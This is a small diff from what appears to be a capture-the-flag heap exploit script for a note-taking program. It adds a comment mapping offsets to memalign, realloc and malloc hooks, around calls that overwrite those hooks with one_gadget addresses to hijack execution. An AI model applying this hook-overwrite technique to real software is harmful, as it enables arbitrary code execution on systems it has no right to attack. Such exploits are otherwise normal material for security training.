@@ -71,6 +71,7 @@ view_note('CCCC')
 delete_note('x')
 edit_note('\x00', p64(hook))
 add_note('FFFF', 0x60, 'f' * 0x60)
+#                                      memalign_hook        realloc_hook           malloc_hook
 add_note('HHHH', 0x60, 'h' * 0x3 + p64(one_gadget_addr) + p64(one_gadget_addr) + p64(realloc_addr)) 
 #add_note('HHHH', 0x60, 'h' * 0x13 + p64(one_gadget_addr))
 
